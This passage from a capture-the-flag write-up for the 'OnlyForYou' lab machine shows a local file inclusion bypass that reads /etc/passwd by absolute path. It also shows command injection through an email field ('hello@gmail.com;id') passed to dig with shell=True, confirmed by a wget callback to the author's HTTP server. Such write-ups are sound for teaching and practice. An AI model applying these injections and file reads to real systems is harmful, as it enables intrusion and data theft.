+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;/list&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isabs</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">filename</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;LIST_FOLDER&#39;</span><span class="p">],</span> <span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Image doesn</span><span class="se">\&#39;</span><span class="s1">t exist!&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;/list&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="p">(</span><span class="ne">TypeError</span><span class="p">,</span> <span class="ne">ValueError</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="n">BadRequest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">page_not_found</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;404.html&#39;</span><span class="p">),</span> <span class="mi">404</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">server_error</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;500.html&#39;</span><span class="p">),</span> <span class="mi">500</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bad_request</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;400.html&#39;</span><span class="p">),</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">405</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">method_not_allowed</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;405.html&#39;</span><span class="p">),</span> <span class="mi">405</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span></code></pre></div><p>We see that it has a download endpoint where it checks basic things for LFI like <code>../</code> characters and also checks if the given path is not absolute, check from the application’s upload directory but if the given path is absolute, then proceed to provide the file in the response. This can be taken into our advantage as we can specify the absolute path of any arbitrary file on the system and retrieve the contents of it, from example giving <code>../../../../.../../etc/paswd</code> will result in failure as it won’t pass the filter check but giving <code>/etc/passwd</code> which is the absolute path, the application will return the file contents.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_2.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>From the further investigation, nothing interesting was found, since we know that there is the main website running, I checked the <code>error.log</code> for the <code>nginx</code> and it showed the directory path for the main site:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_3.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>I grabbed that <code>[app.py](http://app.py)</code> from the <code>only4you.htb</code> directory from the <code>/var/www/</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">flash</span><span class="p">,</span> <span class="n">redirect</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">form</span> <span class="kn">import</span> <span class="n">sendmessage</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">email</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">subject</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;subject&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">message</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">status</span> <span class="o">=</span> <span class="n">sendmessage</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">subject</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">ip</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">status</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Something went wrong!&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">status</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;You are not authorized!&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Your message was successfuly sent! We will reply as soon as possible.&#39;</span><span class="p">,</span> <span class="s1">&#39;success&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;/#contact&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">page_not_found</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;404.html&#39;</span><span class="p">),</span> <span class="mi">404</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">server_errorerror</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;500.html&#39;</span><span class="p">),</span> <span class="mi">500</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bad_request</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;400.html&#39;</span><span class="p">),</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">405</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">method_not_allowed</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;405.html&#39;</span><span class="p">),</span> <span class="mi">405</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span></code></pre></div><p>From the first glance the code had nothing interesting accept <code>form</code> module which was being imported, checking the <code>[form.py](http://form.py)</code> :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">smtplib</span><span class="o">,</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">email.message</span> <span class="kn">import</span> <span class="n">EmailMessage</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">PIPE</span><span class="p">,</span> <span class="n">run</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ipaddress</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">issecure</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">ip</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="s2">&#34;([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})&#34;</span><span class="p">,</span> <span class="n">email</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">domain</span> <span class="o">=</span> <span class="n">email</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;@&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">		<span class="n">result</span> <span class="o">=</span> <span class="n">run</span><span class="p">([</span><span class="sa">f</span><span class="s2">&#34;dig txt </span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="n">output</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="s2">&#34;v=spf1&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">		<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="n">domains</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">			<span class="n">ips</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="s2">&#34;include:&#34;</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">				<span class="n">dms</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;include:.*\.[A-Z|a-z]{2,}&#34;</span><span class="p">,</span> <span class="n">output</span><span class="p">))</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;include:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="n">dms</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="k">for</span> <span class="n">domain</span> <span class="ow">in</span> <span class="n">dms</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">					<span class="n">domains</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">					<span class="k">for</span> <span class="n">domain</span> <span class="ow">in</span> <span class="n">domains</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">						<span class="n">result</span> <span class="o">=</span> <span class="n">run</span><span class="p">([</span><span class="sa">f</span><span class="s2">&#34;dig txt </span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">						<span class="n">output</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">						<span class="k">if</span> <span class="s2">&#34;include:&#34;</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">							<span class="n">dms</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;include:.*\.[A-Z|a-z]{2,}&#34;</span><span class="p">,</span> <span class="n">output</span><span class="p">))</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;include:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">							<span class="n">domains</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">							<span class="k">for</span> <span class="n">domain</span> <span class="ow">in</span> <span class="n">dms</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">								<span class="n">domains</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">						<span class="k">elif</span> <span class="s2">&#34;ip4:&#34;</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">							<span class="n">ipaddresses</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]</span><span class="si">{2}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">output</span><span class="p">))</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;ip4:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">							<span class="n">ipaddresses</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">							<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ipaddresses</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">								<span class="n">ips</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">						<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">							<span class="k">pass</span>
+</span></span><span class="line"><span class="cl">					<span class="k">break</span>
+</span></span><span class="line"><span class="cl">			<span class="k">elif</span> <span class="s2">&#34;ip4&#34;</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">				<span class="n">ipaddresses</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]</span><span class="si">{2}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">output</span><span class="p">))</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;ip4:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="n">ipaddresses</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ipaddresses</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">					<span class="n">ips</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ips</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="n">ip</span> <span class="o">==</span> <span class="n">i</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">			<span class="k">elif</span> <span class="n">ipaddress</span><span class="o">.</span><span class="n">ip_address</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span> <span class="ow">in</span> <span class="n">ipaddress</span><span class="o">.</span><span class="n">ip_network</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">			<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sendmessage</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">subject</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">ip</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">status</span> <span class="o">=</span> <span class="n">issecure</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">ip</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">status</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">msg</span> <span class="o">=</span> <span class="n">EmailMessage</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="n">msg</span><span class="p">[</span><span class="s1">&#39;From&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">email</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">msg</span><span class="p">[</span><span class="s1">&#39;To&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;info@only4you.htb&#39;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">msg</span><span class="p">[</span><span class="s1">&#39;Subject&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">subject</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">msg</span><span class="p">[</span><span class="s1">&#39;Message&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="n">smtp</span> <span class="o">=</span> <span class="n">smtplib</span><span class="o">.</span><span class="n">SMTP</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">25</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="n">smtp</span><span class="o">.</span><span class="n">send_message</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="n">smtp</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">status</span>
+</span></span><span class="line"><span class="cl">	<span class="k">elif</span> <span class="n">status</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">status</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">status</span>
+</span></span></code></pre></div><p>This script performs the pattern to check for the email address then split it in two half and check the address of the domain by calling <code>dig</code> via <code>[subprocess.run](http://subprocess.run)</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">run</span><span class="p">,</span><span class="n">PIPE</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">email</span> <span class="o">=</span> <span class="s2">&#34;hello@gmail.com;id&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="s2">&#34;([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})&#34;</span><span class="p">,</span> <span class="n">email</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Nope, try again&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">domain</span> <span class="o">=</span> <span class="n">email</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;@&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">	<span class="n">result</span> <span class="o">=</span> <span class="n">run</span><span class="p">([</span><span class="sa">f</span><span class="s2">&#34;dig txt </span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">output</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+</span></span></code></pre></div><p>Though the <code>regex</code> was used to check if the <code>pattern</code> matches the email then the second half was passed to the <code>dig</code> command, what we can do here is provide a valid mail and after that add a semicolon in the address, since <code>re.match</code> is used, once the pattern will be found it will return <code>True</code></p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_4.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>As we can see that <code>;id</code> was given at the end of the mail address and is executed. Next, we can try the same payload on the website, here we can just provide the <code>wget</code> command to confirm if it is working and it made the connection to local HTTP Server:</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_5.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">sudo</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span> <span class="o">--</span><span class="n">bind</span> <span class="mf">10.10.14.22</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">kali</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">10.10.14.22</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.14.22</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="mf">10.10.11.210</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">23</span><span class="o">/</span><span class="n">Apr</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">07</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">03</span><span class="p">]</span> <span class="s2">&#34;GET / HTTP/1.1&#34;</span> <span class="mi">200</span> <span class="o">-</span>
